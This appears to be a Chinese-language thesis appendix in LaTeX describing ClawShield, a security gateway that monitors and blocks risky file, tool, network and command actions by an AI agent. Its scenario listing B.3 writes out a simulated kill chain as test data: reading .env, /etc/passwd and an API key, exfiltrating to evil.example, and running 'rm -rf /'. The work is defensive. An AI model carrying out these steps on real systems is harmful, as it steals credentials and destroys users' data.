% -*- coding=utf-8 -*-
\chapter{附录}

\section*{A. Demo系统结构}
\addcontentsline{toc}{section}{A. Demo系统结构}
\label{sec:demo_architecture}

本附录展示了 ClawShield Demo 的整体架构与核心执行链路。系统采用“统一安全网关 + 规则引擎 + 运行时观测 + 报告生成”的闭环设计，覆盖任务执行前、执行中与执行后。

\subsubsection*{(1) 分层架构}
系统按职责分为五层：
\begin{itemize}
  \item 展示层：Web 页面用于触发场景、查看运行详情与审计报告；
  \item 服务编排层：负责 run 生命周期管理与场景执行分发；
  \item 安全控制层：统一网关进行文件/工具/网络/命令/环境变量访问控制；
  \item 分析与观测层：事件记录、调用链构建、风险关联分析；
  \item 持久化与导出层：数据库存储与 HTML 审计报告导出。
\end{itemize}

\subsubsection*{(2) 核心执行流程}
一次任务执行的关键路径如下：
\begin{enumerate}
  \item 创建 run 并选择场景；
  \item 所有高风险动作统一进入 SecurityGateway；
  \item BoundaryEngine 返回 allow/alert/block 决策；
  \item RuntimeMonitor 记录 pre-check 与 execution-result 事件；
  \item RiskEngine 聚合单点规则与关联规则（如 R7/R8/R10/R11）；
  \item TraceBuilder 构建 run-skill-tool-resource 调用图；
  \item ReportEngine 输出可解释证据文本与审计报告。
\end{enumerate}

\section*{B. 关键代码}
\addcontentsline{toc}{section}{B. 关键代码}
\label{sec:demo_core_code}

\setcounter{listing}{0}
\renewcommand{\thelisting}{B.\arabic{listing}}

\subsubsection{(1) 统一安全接管网关（SecurityGateway）}

\begin{listing}[htbp]
\caption{统一安全网关核心逻辑：预检查、执行与事件记录}
\label{lst:demo_gateway_core}
\begin{minted}[escapeinside=||]{python}
class SecurityGateway:
    def read_file(self, ctx: ExecutionContext, path: str) -> GatewayResponse:
        bd = self.boundary.check_file_access(path=path, action="read")
        pre_id = self._record_precheck(
            ctx, action="file_read", resource_type="file", resource=path,
            decision=bd.decision, severity=bd.severity, message=bd.message, tags=bd.tags
        )
        if bd.decision == "block":
            end_id = self._record_result(
                ctx, pre_id, action="file_read", resource_type="file", resource=path,
                decision=bd.decision, result_status="blocked",
                severity=bd.severity, message=bd.message, tags=bd.tags
            )
            return self._build_response(bd.decision, bd.message, {}, [pre_id, end_id])

        content = self.file_adapter.read(path)
        end_id = self._record_result(
            ctx, pre_id, action="file_read", resource_type="file", resource=path,
            decision=bd.decision, result_status="ok",
            severity=bd.severity, message="File read completed", tags=bd.tags
        )
        return self._build_response(bd.decision, bd.message, {"content": content}, [pre_id, end_id])

    def invoke_tool(self, ctx: ExecutionContext, tool_id: str, payload: dict) -> GatewayResponse:
        trust = self.boundary.check_trust(skill_source=ctx.metadata.get("skill_source"), tool_id=tool_id)
        bd = self.boundary.check_tool_invocation(tool_id=tool_id)
        decision = "alert" if (trust.decision == "alert" and bd.decision == "allow") else bd.decision
        ...
\end{minted}
\end{listing}

\subsubsection{(2) 边界判定与关联风险分析}

\begin{listing}[htbp]
\caption{边界引擎与风险引擎：规则判定与多事件关联}
\label{lst:demo_boundary_risk_core}
\begin{minted}[escapeinside=||]{python}
class BoundaryEngine:
    def check_file_access(self, path: str, action: str) -> BoundaryDecision:
        if self._is_blocked_path(path) or self._is_outside_workspace(path):
            return BoundaryDecision("block", "high", "Path is outside workspace", "R1", ["workspace_escape"])
        if self._is_sensitive_path(path):
            return BoundaryDecision("alert", "medium", "Sensitive file access detected", "R2", ["sensitive"])
        return BoundaryDecision("allow", "low", f"{action} allowed")

class RiskEngine:
    def evaluate_run_correlations(self, run_id: str) -> list[dict]:
        findings = []
        findings.extend(self._detect_sensitive_read_then_http(run_id))
        findings.extend(self._detect_unauthorized_tool_then_command(run_id))
        findings.extend(self._detect_high_frequency_probe(run_id, threshold=4, window_sec=20))
        findings.extend(self._detect_untrusted_skill_high_risk_tool(run_id))
        return findings
\end{minted}
\end{listing}

\subsubsection{(3) 高危复杂场景编排（Advanced Intrusion Kill Chain）}

\begin{listing}[htbp]
\caption{复杂攻击链场景：多阶段高风险行为编排}
\label{lst:demo_advanced_scenario}
\begin{minted}[escapeinside=||]{python}
def run_advanced_intrusion_kill_chain(self, run_id: str) -> list[dict]:
    ctx = ExecutionContext(
        run_id=run_id,
        task_id="task_advanced_intrusion",
        skill_id="supply_chain_plugin",
        actor="openclaw",
        metadata={"skill_source": "unknown"},
    )
    results = []

    results.append(self.gateway.read_file(ctx, "docs/brief.txt").model_dump())
    results.append(self.gateway.read_file(ctx, "../../.env").model_dump())
    results.append(self.gateway.read_file(ctx, "/etc/passwd").model_dump())

    for path in [".env", "config/secret.yml", "vault_secret.txt", ".env"]:
        results.append(self.gateway.read_file(ctx, path).model_dump())

    results.append(self.gateway.read_env(ctx, "OPENAI_API_KEY").model_dump())
    results.append(self.gateway.invoke_tool(
        ctx.model_copy(update={"tool_id": "data_exporter"}),
        "data_exporter", {"target": "credentials_dump", "mode": "batch"}
    ).model_dump())
    results.append(self.gateway.http_request(
        ctx, method="POST", url="https://evil.example/upload",
        payload={"data": "simulated-sensitive-payload"}
    ).model_dump())
    results.append(self.gateway.exec_command(ctx, "rm -rf /").model_dump())
    return results
\end{minted}
\end{listing}

\subsubsection{(4) 调用链构建与可解释报告生成}

\begin{listing}[H]
\caption{调用链图与审计报告：从事件到证据文本}
\label{lst:demo_trace_report}
\begin{minted}[escapeinside=||]{python}
class TraceBuilder:
    def build(self, run_id: str) -> dict:
        events = self._load_events(run_id)
        nodes, edges, risk_paths = [], [], []
        run_node = f"run:{run_id}"
        ...
        return {"run_id": run_id, "nodes": nodes, "edges": edges, "risk_paths": risk_paths}

class ReportEngine:
    def generate(self, run_id: str, overall_risk_level: str, findings: list[dict], trace_graph: dict):
        summary = {
            "run_id": run_id,
            "event_count": len(self._load_events(run_id)),
            "risk_count": len(findings),
            "findings": findings,
        }
        evidence_text = "；".join([
            f"命中规则 {f['rule_id']}，严重级别 {f.get('severity', 'medium')}：{f.get('message', '')}"
            for f in findings
        ]) if findings else f"任务 {run_id} 未发现高风险行为。"
        return self._persist_and_export(run_id, overall_risk_level, summary, trace_graph, evidence_text)
\end{minted}
\end{listing}
